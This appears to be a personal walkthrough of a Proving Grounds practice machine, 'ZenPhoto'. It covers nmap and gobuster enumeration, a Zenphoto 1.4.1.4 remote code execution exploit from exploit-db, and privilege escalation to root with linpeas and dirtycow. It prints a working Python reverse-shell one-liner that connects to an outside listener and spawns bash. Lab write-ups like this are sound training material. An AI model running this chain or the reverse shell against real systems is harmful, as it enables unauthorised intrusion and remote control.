IP: `192.168.154.41`

# Nmap results
---
```
┌──(kali㉿kali)-[~/PGPractice/Linux/ZenPhoto]
└─$ nmap -sV -sC 192.168.154.41 -oN nmap/nmap_common -T4     
Host is up (0.081s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
|_http-server-header: CUPS/1.4
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Nothing found while enumerating other services except port 80

# Port 80
---
- Gobuster: Found `/test` directory
	- `gobuster dir -u "http://192.168.154.41" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -x php,zip,txt`
	- ![[Pasted image 20260328140043.png]]

- Opening this directory on browser and inspecting the page:
	- ![[Pasted image 20260328140129.png]]
	- **Zenphoto version 1.4.1.4** : which is vulnerable to **==Remote Code Execution==**
		- `https://www.exploit-db.com/exploits/18083`
## Exploiting Zenphoto:
- Copy the php script from exploit-db and run it:
	- `php zenphoto.php 192.168.154.41 /test/`
	- This gives us a shell:
		- ![[Pasted image 20260328140302.png]]

# Upgrade the shell using python
---
- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.192",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
- ![[Pasted image 20260328140630.png]]

# Privelege Escalation
---
- Transfer linpeas and run it:
	- Nothing very useful came up except for **dirtycow2**:
	- ![[Pasted image 20260328143842.png]]
- Transfer and compile dirtycow:
	- ![[Pasted image 20260328143917.png]]
	- Run it:
		- ![[Pasted image 20260328143950.png]]
	- We got the root shell:
		- ![[Pasted image 20260328144025.png]]